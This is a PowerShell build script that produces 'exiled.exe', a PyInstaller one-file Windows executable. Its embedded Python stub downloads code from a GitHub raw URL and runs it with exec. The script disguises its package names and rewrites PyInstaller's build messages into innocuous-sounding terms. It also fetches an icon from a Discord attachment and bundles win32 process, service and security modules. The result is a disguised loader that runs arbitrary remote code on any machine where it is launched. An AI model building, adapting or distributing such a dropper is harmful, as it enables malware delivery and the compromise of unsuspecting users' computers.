[CmdletBinding()]
param(
    [string]$Out = "exiled",
    [string]$Url = "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/external.py",
    [string]$Icon = "https://cdn.discordapp.com/attachments/1518813807562985523/1561087177830568117/97hf98h.png?ex=6ad5133a&is=6ad3c1ba&hm=b13f7b1e0005510bba4cbb354a6186d8f2569324cbc2e8666211ea6dfa84fe03&animated=true",
    [string]$Dir,
    [string]$PythonExe,
    [switch]$NoIcon,
    [switch]$KeepBuild,
    [switch]$Verbose
)

$ErrorActionPreference = "Stop"
$ProgressPreference    = "SilentlyContinue"

$AppName   = "exiled"
$RemoteUrl = $Url
$IconSrc   = $Icon
$OutName   = $Out
$UseIcon   = -not $NoIcon

# display name -> real pip package
$DepMap = @{
    "libinstaller" = "pyinstaller"
    "libpil"       = "pillow"
    "win32api"     = "pywin32"
    "sysmon"       = "psutil"
    "libhttp"      = "requests"
}
$Packages = @("libinstaller", "libpil", "win32api", "sysmon", "libhttp")

# PyInstaller vocabulary -> bench vocabulary
$StageMap = [ordered]@{
    "Analyzing"          = "scanning"
    "Processing"         = "hooking"
    "Caching"            = "indexing"
    "Building"           = "packing"
    "Checking"           = "verifying"
    "Appending"          = "stitching"
    "Including"          = "linking"
    "Copying"            = "staging"
    "Embedding"          = "stamping"
    "Fixing"             = "polishing"
    "Looking"            = "seeking"
    "Removing"           = "sweeping"
    "Writing"            = "recording"
    "Graph"              = "graph"
    "Creating"           = "weaving"
    "Reclassifying"      = "sorting"
    "Extra DLL"          = "dll"
    "Target bytecode"    = "bytecode"
    "Initializing"       = "warming"
    "Running"            = "walking"
    "Using Python"       = "python"
    "Platform"           = "host"
    "Python environment" = "env"
}

$Arch = if ([Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }

function Write-Msg {
    param([string]$Level, [string]$Message)
    switch ($Level) {
        "error"   { Write-Host $Message -ForegroundColor Red }
        "warning" { Write-Host $Message -ForegroundColor DarkYellow }
        "green"   { Write-Host $Message -ForegroundColor Green }
        default   { Write-Host $Message }
    }
}

function Translate-Line {
    param([string]$Line)
    if ($Line -match '^\s*(\d+)\s+(\w+):\s*(.*)$') {
        $msg = $matches[3]
        foreach ($k in $StageMap.Keys) {
            if ($msg -like "$k*") {
                $rest = $msg.Substring($k.Length).TrimStart()
                return "[$AppName] $($StageMap[$k])  ->  $rest"
            }
        }
        return "[$AppName] $($msg.ToLower())"
    }
    return $null
}

function Test-Python {
    param([string]$Exe)
    if (-not $Exe) { return $false }
    if (-not (Test-Path -LiteralPath $Exe)) { return $false }
    & $Exe -c "import sys; sys.exit(0)" 2>$null
    return ($LASTEXITCODE -eq 0)
}

function Find-Python {
    $candidates = @()
    if ($PythonExe) { $candidates += $PythonExe }
    foreach ($cand in @("python", "py", "python3")) {
        $cmd = Get-Command $cand -ErrorAction SilentlyContinue
        if ($cmd) { $candidates += $cmd.Source }
    }
    foreach ($root in @(
        "$env:LocalAppData\Programs\Python",
        "$env:ProgramFiles\Python*",
        "${env:ProgramFiles(x86)}\Python*"
    )) {
        Get-ChildItem -Path $root -Filter "python.exe" -Recurse -ErrorAction SilentlyContinue |
            ForEach-Object { $candidates += $_.FullName }
    }
    foreach ($c in $candidates) {
        if (Test-Python -Exe $c) { return $c }
    }
    return $null
}

function Install-Python {
    Write-Msg warning "Python not found — attempting install..."

    $winget = Get-Command winget -ErrorAction SilentlyContinue
    if ($winget) {
        Write-Msg info "Trying winget install Python.Python.3.12..."
        & winget install --id Python.Python.3.12 --scope user --silent `
            --accept-package-agreements --accept-source-agreements 2>$null
        if ($LASTEXITCODE -eq 0) {
            Write-Msg info "winget install finished."
        } else {
            Write-Msg warning "winget install returned $LASTEXITCODE — falling back."
        }
    } else {
        Write-Msg warning "winget not available — falling back to direct download."
    }

    $pyVer  = "3.12.7"
    $pyArch = if ([Environment]::Is64BitOperatingSystem) { "amd64" } else { "win32" }
    $pyUrl  = "https://www.python.org/ftp/python/$pyVer/python-$pyVer-$pyArch.exe"
    $pyInst = Join-Path $env:TEMP "python-$pyVer-$pyArch.exe"

    if (-not (Test-Path -LiteralPath $pyInst)) {
        Write-Msg info "Downloading $pyUrl..."
        try {
            Invoke-WebRequest -Uri $pyUrl -OutFile $pyInst -UseBasicParsing
        } catch {
            Write-Msg error "Error: python download failed — $($_.Exception.Message)"
            return $null
        }
    }

    Write-Msg info "Running silent install (user scope, no PATH prompt)..."
    $installArgs = @(
        "/quiet",
        "InstallAllUsers=0",
        "PrependPath=1",
        "Include_test=0",
        "Include_launcher=1",
        "SimpleInstall=1"
    )
    $proc = Start-Process -FilePath $pyInst -ArgumentList $installArgs -Wait -PassThru
    if ($proc.ExitCode -ne 0) {
        Write-Msg error "Error: python installer exited $($proc.ExitCode)"
        return $null
    }

    $machinePath = [Environment]::GetEnvironmentVariable("Path", "Machine")
    $userPath    = [Environment]::GetEnvironmentVariable("Path", "User")
    $env:Path    = "$machinePath;$userPath"

    return $null
}

function Install-Packages {
    param([string]$Exe, [string[]]$Names)
    $real = @()
    foreach ($n in $Names) {
        if ($DepMap.ContainsKey($n)) { $real += $DepMap[$n] } else { $real += $n }
    }
    Write-Msg info "Installing modules: $($Names -join ', ')"
    & $Exe -m pip install --quiet --upgrade pip
    & $Exe -m pip install --quiet --upgrade @real
    if ($LASTEXITCODE -ne 0) {
        Write-Msg error "module install failed."
        exit 1
    }
}

# Async-drained process runner — both pipes read on separate threads so
# neither buffer can fill and deadlock the child (the classic PyInstaller hang).
function Invoke-Quiet {
    param([string]$Exe, [string[]]$Args, [string]$LogFile)

    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName               = $Exe
    $psi.Arguments              = ($Args | ForEach-Object { if ($_ -match '\s') { '"' + $_ + '"' } else { $_ } }) -join ' '
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError  = $true
    $psi.UseShellExecute        = $false
    $psi.CreateNoWindow         = $true
    $psi.StandardOutputEncoding = [System.Text.Encoding]::UTF8
    $psi.StandardErrorEncoding  = [System.Text.Encoding]::UTF8

    $p = New-Object System.Diagnostics.Process
    $p.StartInfo = $psi
    $p.EnableRaisingEvents = $true

    $verboseFlag = $Verbose
    $logPath     = $LogFile

    $outAction = {
        $line = $Event.SourceEventArgs.Data
        if ($null -ne $line -and $line -ne '') {
            if ($verboseFlag) {
                if ($logPath) { Add-Content -LiteralPath $logPath -Value $line -Encoding UTF8 }
                Write-Host $line -ForegroundColor DarkGray
            } else {
                $t = Translate-Line -Line $line
                if ($t) { Write-Host $t -ForegroundColor DarkCyan }
            }
        }
    }.GetNewClosure()

    $errAction = {
        $line = $Event.SourceEventArgs.Data
        if ($null -ne $line -and $line -ne '') {
            if ($verboseFlag) {
                if ($logPath) { Add-Content -LiteralPath $logPath -Value $line -Encoding UTF8 }
                Write-Host $line -ForegroundColor DarkYellow
            }
        }
    }.GetNewClosure()

    $subs = @()
    $subs += Register-ObjectEvent -InputObject $p -EventName OutputDataReceived -Action $outAction
    $subs += Register-ObjectEvent -InputObject $p -EventName ErrorDataReceived  -Action $errAction

    try {
        $p.Start() | Out-Null
        $p.BeginOutputReadLine()
        $p.BeginErrorReadLine()
        $p.WaitForExit()
        Start-Sleep -Milliseconds 250
    } finally {
        foreach ($s in $subs) {
            Unregister-Event -SubscriptionId $s.Id -ErrorAction SilentlyContinue
            Remove-Job -Id $s.Id -Force -ErrorAction SilentlyContinue
        }
    }
    return $p.ExitCode
}

$PythonExe = Find-Python
if (-not $PythonExe) {
    Install-Python | Out-Null
    $PythonExe = Find-Python
}
if (-not $PythonExe) {
    Write-Msg error "Error: python unavailable after install attempt. Pass -PythonExe C:\Path\to\python.exe"
    exit 1
}

Write-Msg info "Using python: $PythonExe"

& $PythonExe -c "import tkinter" 2>$null
if ($LASTEXITCODE -ne 0) {
    Write-Msg error "Error: $PythonExe has no tkinter. Install tcl/tk or pass -PythonExe with a Python that has it."
    exit 1
}

Install-Packages -Exe $PythonExe -Names $Packages

$UseCurl = $null -ne (Get-Command curl.exe -ErrorAction SilentlyContinue)
if (-not $UseCurl) {
    $IWR = Get-Command Invoke-WebRequest -ErrorAction SilentlyContinue
    if (-not $IWR) {
        Write-Msg error "Error: neither curl.exe nor Invoke-WebRequest available."
        exit 1
    }
}

if ($Dir) {
    $Here = (Resolve-Path -LiteralPath $Dir).Path
} else {
    $Here = (Get-Location).Path
}
$Work    = Join-Path $Here "_build"
$Stub    = Join-Path $Work "payload.py"
$IconRaw = Join-Path $Work "icon.raw"
$IconIco = Join-Path $Work "icon.ico"
$DistDir = Join-Path $Here "dist"
$LogFile = Join-Path $Work "build.log"

Write-Msg info ""
Write-Msg info "Building $AppName for windows-$Arch"
Write-Msg info "Python: $PythonExe"
Write-Msg info "Output dir: $Here"

New-Item -ItemType Directory -Force -Path $Work    | Out-Null
New-Item -ItemType Directory -Force -Path $DistDir | Out-Null
Set-Content -Path $LogFile -Value "" -Encoding UTF8

$stubBody = @"
import urllib.request
import tkinter
import tkinter.ttk
import tkinter.messagebox
import tkinter.filedialog
import tkinter.simpledialog
import tkinter.scrolledtext
import tkinter.font
import tkinter.colorchooser
exec(compile(urllib.request.urlopen('$RemoteUrl').read(), '<url>', 'exec'))
"@
Set-Content -Path $Stub -Value $stubBody -Encoding UTF8

if ($UseIcon) {
    if ($IconSrc -match '^https?://') {
        Write-Msg info "Fetching icon..."
        if ($UseCurl) {
            & curl.exe -fsSL -A "Mozilla/5.0" $IconSrc -o $IconRaw
        } else {
            Invoke-WebRequest -Uri $IconSrc -Headers @{ "User-Agent" = "Mozilla/5.0" } -OutFile $IconRaw
        }
    } else {
        if (-not (Test-Path -LiteralPath $IconSrc)) {
            Write-Msg error "Error: icon file not found at $IconSrc"
            exit 1
        }
        Copy-Item -LiteralPath $IconSrc -Destination $IconRaw -Force
    }
}

if ($UseIcon) {
    Write-Msg info "Converting icon to .ico..."
    $conv = @"
from PIL import Image
img = Image.open(r'$IconRaw')
if img.mode != 'RGBA':
    img = img.convert('RGBA')
img.save(r'$IconIco', format='ICO', sizes=[(256,256),(128,128),(64,64),(48,48),(32,32),(16,16)])
"@
    $convTmp = Join-Path $Work "_icon_conv.py"
    Set-Content -Path $convTmp -Value $conv -Encoding UTF8
    & $PythonExe $convTmp
    if ($LASTEXITCODE -ne 0) {
        Write-Msg error "icon conversion failed."
        exit 1
    }
}

Write-Msg info "Freezing..."

$pyiArgs = @(
    "-m", "PyInstaller",
    "--onefile",
    "--noconfirm",
    "--clean",
    "--name", $OutName,
    "--distpath", $DistDir,
    "--workpath", (Join-Path $Work "pyi"),
    "--specpath", $Work,
    "--collect-all", "tkinter",
    "--collect-all", "PIL",
    "--collect-submodules", "win32com",
    "--hidden-import", "win32api",
    "--hidden-import", "win32con",
    "--hidden-import", "win32file",
    "--hidden-import", "win32process",
    "--hidden-import", "win32security",
    "--hidden-import", "win32event",
    "--hidden-import", "win32service",
    "--hidden-import", "win32serviceutil",
    "--hidden-import", "win32timezone",
    "--hidden-import", "pythoncom",
    "--hidden-import", "pywintypes",
    "--hidden-import", "psutil",
    "--hidden-import", "requests"
)
if ($UseIcon) {
    $pyiArgs += @("--icon", $IconIco)
}
$pyiArgs += $Stub

$rc = Invoke-Quiet -Exe $PythonExe -Args $pyiArgs -LogFile $LogFile
if ($rc -ne 0) {
    Write-Msg error "PyInstaller failed (exit $rc) — see $LogFile"
    exit 1
}

if (-not $KeepBuild) {
    Remove-Item -Recurse -Force $Work -ErrorAction SilentlyContinue
}

$ExePath = Join-Path $DistDir "$OutName.exe"

if (Test-Path -LiteralPath $ExePath) {
    $sz = [math]::Round((Get-Item $ExePath).Length / 1MB, 2)
    Write-Msg green ""
    Write-Msg green "  exiled.exe  ready  ($sz MB)"
    Write-Msg green "  $ExePath"
    Write-Msg green ""
} else {
    Write-Msg error "exe not produced"
    exit 1
}
